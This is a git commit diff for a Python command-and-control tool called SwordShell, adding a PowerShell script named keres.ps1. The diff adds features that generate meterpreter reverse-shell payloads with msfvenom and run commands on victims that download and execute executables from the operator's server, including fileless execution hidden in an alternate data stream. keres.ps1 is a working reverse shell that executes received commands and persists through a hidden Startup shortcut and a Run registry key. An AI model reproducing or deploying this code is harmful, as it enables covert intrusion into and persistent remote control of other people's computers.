025e1d46a4b4c4d248ca0deccf9be947b992f299
Moncef <mxclanhunter@gmail.com>
2024-05-05 13:38:35 -0700

    ..

--- Swordshell.py
+++ Swordshell.py
@@ -13,7 +13,10 @@ import random
 import select
 import argparse
 import readline
-
+import http.server
+import socketserver
+import base64
+import requests
 # List of ASCII art banners
 banners = [
     '''
@@ -180,7 +183,7 @@ ___<__(|) _   ""-/  / /   /
             {{{}}}
               ()
     """
-    # Add more banners as needed
+ 
 ]
 
 colors = [
@@ -194,59 +197,111 @@ colors = [
 ]
 commands = """
 Commands:
+  help          - Show this help menu
   list        - List all sessions
   session <id> - Interact with a session
-  exit | Ctrl +c*2    - Exit the SwordShell
+  upgrade <id> - Upgrade a shell to a meterpreter shell (require metasploit)
+  exec <id> <url> <TYPE> - Execute a PE file in memory filelessly  (EXE, DLL) , doesnt work for gui apps
+  persist <id> - Persist a shell using keres(persistance module) 
+  exit | Ctrl +c*2    - Exit SwordShell
 """
 # Clear the terminal screen
 os.system('cls' if os.name == 'nt' else 'clear')
 
 # Print the ASCII art banner
 print(random.choice(colors) + random.choice(banners) +"\n" +'\033[0m' + commands)  # '\033[0m' resets the color# def shellreceiver(conn):
-#     global session_started
-#     while True:
-        
-           
-#         try:
-            
-            
-#             data=conn.recv(1)
-#             print(data.decode(), end="", flush=True)
-#         except :
-#             print("server/socket must have died...time to hop off")
-#             remove_connection(conn)
-#             session_started = False
-#             break
-
-# def shellsender(conn):
-#     global session_started
-#     while True:
-       
-#         try:
-#             mycmd=input(Fore.YELLOW + "\n" + Fore.WHITE)
-#             mycmd=mycmd+"\n"
-#             conn.send(mycmd.encode())
-        
-#         except :
-#             print("server/socket must have died...time to hop off")
-#             remove_connection(conn)
-#             session_started = False
-#             break
-
 
 parser = argparse.ArgumentParser(description="Run the Swordshell program.")
 
 # Add the arguments
-parser.add_argument('-host', type=str, default='0.0.0.0', help='The host to connect to.')
-parser.add_argument('-port', type=int, default=5555, help='The port to connect to.')
-
+parser.add_argument('-host', type=str, default='0.0.0.0', help='host ip.')
+parser.add_argument('-port', type=int, default=5555, help='The port to listen on.')
+parser.add_argument('-http-server-port', type=int, default=8585, help='The port to connect to.')
 # Parse the arguments
 args = parser.parse_args()
 
 # Use the arguments
 host = args.host
 port = args.port
+http_server_port = args.http_server_port
+class QuietHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
+    def log_message(self, format, *args):
+        return
+def start_http_server(port=8585):
+    handler = QuietHTTPRequestHandler
+    try:
+        httpd = socketserver.TCPServer(("", port), handler)
+        print(f"HTTP server is starting at port {port}")
+        httpd.serve_forever()
+    except OSError as e:
+        if e.errno == 98:  # Address already in use
+            return
+        else:
+            raise e
+        
 
+
+
+def persist_shell(conn, addr, shell_id):
+    # Read the PowerShell script from the file
+    with open('keres.ps1', 'r') as file:
+        ps_script = file.read()
+
+    # Replace the server address and port
+    ps_script = ps_script.replace('server_address', get_my_ip())
+    ps_script = ps_script.replace('port_number', '5555')
+
+    # Convert the script to a base64 string
+    encoded_ps_script = base64.b64encode(ps_script.encode('utf-16le')).decode()
+
+    # Create the PowerShell command
+    command = f'powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_ps_script}'
+    print("\033[91m[*] Executing Keres ..... \033[0m")
+    # Execute the command
+    subprocess.run(command, shell=True)
+def upgrade_shell(conn,addr, shell_id):
+    # Start HTTP server in a new thread
+
+    print("\033[91m[*] Upgrading shell to meterpreter shell ..... \033[0m")
+    subprocess.run(["msfvenom", "-p", "windows/x64/meterpreter_reverse_tcp", f"lhost={get_my_ip()}", "lport=4444", "-f", "exe", "-o", "./meter/https.exe"])    
+    print("\033[91mgenerated meterpreter payload")
+    
+    command = f"""cmd /c "cd %TEMP% && curl http://{get_my_ip()}:8585/exec.exe -OJ && exec.exe http://{get_my_ip()}:8585/meter/https.exe EXE" """
+    conn.send(command.encode())
+    print("Host : "+get_my_ip() + " Port : 4444")
+    time.sleep(2)   
+    print(f"Upgraded shell {shell_id} from IP {addr} to a meterpreter shell")
+    print("run metasploit listener with the following commands: \033[0m")
+    print("     use exploit/multi/handler")
+    print("     set payload windows/x64/meterpreter_reverse_tcp")
+    print("     set lhost 0.0.0.0")
+    print("     set lport 4444")
+    print("     exploit")
+
+def exec_shell(conn, addr, shell_id, url, type):
+
+    print("\033[94m[*] Executing PE Filelessly in memory on shell {shell_id} from IP {addr}")
+    command = f"""cmd.exe /c  "curl http://{get_my_ip()}:8585/exec.exe -o %TEMP%\sys.m:_.exe && cd %TEMP% && powershell.exe -windowstyle hidden -c .\sys.m:_.exe {url} {type}" """
+    conn.send(command.encode())
+    
+    time.sleep(2)
+    print(command)
+    print("[*] DONE\033[0m")
+    
+def get_my_ip(host=None):
+    if host and host != '0.0.0.0':
+        return host
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # doesn't even have to be reachable
+        s.connect(('10.255.255.255', 1))
+        IP = s.getsockname()[0]
+    except Exception:
+        IP = '127.0.0.1'
+    finally:
+        s.close()
+    return IP
 
 def handle_client(conn, addr):
     print(Fore.GREEN, f'\n[*] Connecting to session: {addr[0]}:{addr[1]}', Fore.WHITE)
@@ -267,7 +322,8 @@ def handle_client(conn, addr):
                 mycmd = mycmd + "\n"
                 conn.send(mycmd.encode())
 
-
+print(Fore.YELLOW + "[+] Your local IP : "+get_my_ip(), Fore.WHITE)
+print(Fore.YELLOW + "[+] Your public IP : "+requests.get('https://api.ipify.org').text, Fore.WHITE)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((host, port))
@@ -286,11 +342,12 @@ non_daemon_threads = []
 def accept_connections():
     while True:
         conn, addr = s.accept()
-        if addr[0] not in (connection[1][0] for connection in connections):
+        ip_connections = [connection for connection in connections if connection[1][0] == addr[0]]
+        if len(ip_connections) < 3:
             connections.append((conn, addr))
             print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]}', Fore.WHITE)
-           
         else:
+            print(Fore.RED, f'\n[*] Connection limit reached for: {addr[0]}', Fore.WHITE)
             conn.close()
 # Create a new thread that will run the accept_connections function
 accept_thread = threading.Thread(target=accept_connections)
@@ -304,7 +361,9 @@ def handler(signum, frame):
 # Set the signal handler
 signal.signal(signal.SIGALRM, handler)
 first_press_time = None
-
+http_server_thread = threading.Thread(target=start_http_server)
+http_server_thread.daemon = True
+http_server_thread.start()
 ctrl_c_count = 0
 session_started = False
 while True:
@@ -318,10 +377,35 @@ while True:
             if not session_started:
                 command = input(Fore.YELLOW + "\n-{-->> " + Fore.GREEN)
                 readline.add_history(command)
-
+                if command.startswith('persist '):
+                    shell_id = command.split()[1]
+                    session = int(command.split(' ')[1]) - 1
+                    conn, addr = connections[session]  # Get the shell ID from the command
+                    persist_shell(conn, addr, shell_id)
+                if command.startswith('upgrade '):
+                    shell_id = command.split()[1]
+                    session = int(command.split(' ')[1]) - 1
+                    conn, addr = connections[session]  # Get the shell ID from the command
+                    upgrade_shell(conn, addr, shell_id)
                 if command.strip() == '':
                      break
-                     
+                if command.strip() == 'help':
+                     print(commands)
+                     break
+                if command.startswith('exec '):
+                    parts = command.split()
+                    if len(parts) < 4:
+                        print("Invalid command. Usage: exec <id> <url> <TYPE>")
+                        print("example :exec 2 http://payload.com/evil.exe  EXE")
+                        continue
+
+                    shell_id = parts[1]
+                    url = parts[2]
+                    type = parts[3]
+                    session = int(shell_id) - 1
+                    print(url,type)
+                    conn, addr = connections[session]  # Get the shell ID from the command
+                    exec_shell(conn, addr, shell_id, url,type)     
                 if command == 'list':
                     print("\nAvailable sessions:")
                     for i, connection in enumerate(connections):
---
+++ keres.ps1
@@ -0,0 +1,117 @@
+ 
+param(
+    [string]$ScriptPath =(Resolve-Path -Path $MyInvocation.MyCommand.Path),
+    [string]$IconLocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe",
+    [string]$HotKey = "CTRL+W",
+    [string]$Description = "powershell",
+    [int]$WindowStyle = 7,
+    [switch]$Hidden = $true,
+    [switch]$p,
+    [string]$ScriptArgument = ""
+)
+
+# If -p parameter is present, create the shortcut
+if ($p) {
+    #Define the path for the shortcut in the Startup folder
+	$shortcutPath = "$([Environment]::GetFolderPath('Startup'))\Meow.lnk"
+	$registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+    Set-ItemProperty -Path $registryPath -Name Meow -Value $shortcutPath
+
+    # Create a WScript Shell object
+    $wshell = New-Object -ComObject Wscript.Shell
+
+    # Create or modify the shortcut object
+    $shortcut = $wshell.CreateShortcut($shortcutPath)
+
+    # Set the icon location for the shortcut
+    $shortcut.IconLocation = $IconLocation
+
+    # Set the target path and arguments for the shortcut
+    $shortcut.TargetPath = "powershell.exe"
+    $shortcut.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $ScriptPath "
+
+    # Set the working directory for the shortcut
+    $shortcut.WorkingDirectory = (Get-Item $ScriptPath).DirectoryName
+
+    # Set a hotkey for the shortcut
+    $shortcut.HotKey = $HotKey
+
+    # Set a description for the shortcut
+    $shortcut.Description = $Description
+
+    # Set the window style for the shortcut
+    $shortcut.WindowStyle = $WindowStyle
+
+    # Save the shortcut
+    $shortcut.Save()
+
+    # Optionally set the 'Hidden' attribute
+    if ($Hidden) {
+        [System.IO.File]::SetAttributes($shortcutPath, [System.IO.FileAttributes]::Hidden)
+    }
+}
+
+$uniqueIdentifier = "Keres"
+$maxProcesses = 1
+$spawnedProcesses = 0
+
+while ($true){{
+    $isRunning = Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}
+
+    if (-not $isRunning -and $spawnedProcesses -lt $maxProcesses) {{
+        $connectionTest = Test-Connection -ComputerName 'server_address' -Count 1 -Quiet
+
+        if ($connectionTest) {{
+            Start-Process $PSHOME\powershell.exe -ArgumentList {{
+                $uniqueIdentifier
+                $client = New-Object System.Net.Sockets.TcpClient
+
+                try {{
+                    $client.Connect('server_address', port_number)
+                    $stream = $client.GetStream()
+
+                    while ($true) {{
+                        if (-not $client.Connected) {{
+                            Write-Host "Connection lost. Reconnecting..."
+                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
+                            break
+                        }}
+
+                        $bytes = New-Object byte[] 65535
+                        $i = $stream.Read($bytes, 0, $bytes.Length)
+
+                        if ($i -le 0) {{
+                            Write-Host "Connection to server closed. Reconnecting..."
+                            Start-Sleep -Seconds 60  # Wait for 60 seconds before attempting to reconnect
+                            break
+                        }}
+
+                        $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
+                        $sendback = (iex $data 2>&1 | Out-String)
+                        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+                        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
+                        $stream.Write($sendbyte, 0, $sendbyte.Length)
+                        $stream.Flush()
+                    }}
+                }} catch {{
+                    Write-Host "Error: $_"
+                }} finally {{
+                    if ($stream) {{ $stream.Close() }}
+                    if ($client) {{ $client.Close() }}
+                }}
+            }} -WindowStyle Hidden
+
+            $spawnedProcesses++
+        }} else {{
+            Write-Host "No connection to the server. Skipping process spawn."
+        }}
+    }} elseif ($spawnedProcesses -ge $maxProcesses) {{
+        Write-Host "Maximum number of processes reached. Skipping process spawn."
+    }} else {{
+        Write-Host "Script is already running."
+    }}
+
+    # Count processes after a 60-second wait
+    Start-Sleep -Seconds 60
+    $spawnedProcesses = (Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object {{ $_.CommandLine -like "*$uniqueIdentifier*" }}).Count
+}}
